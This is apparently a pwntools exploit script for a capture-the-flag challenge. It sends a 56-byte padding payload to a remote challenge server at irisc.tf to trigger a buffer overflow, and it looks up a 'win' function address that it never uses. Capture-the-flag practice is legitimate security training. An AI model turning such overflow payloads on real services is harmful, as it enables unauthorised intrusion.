from pwn import *

exe = context.binary = ELF("vuln")

winaddr = exe.symbols["win"]

payload = b'A' * 56

io = remote("insanity-check.chal.irisc.tf", 10003)
io.sendline(payload)
io.recvline()
print(io.recvline().decode())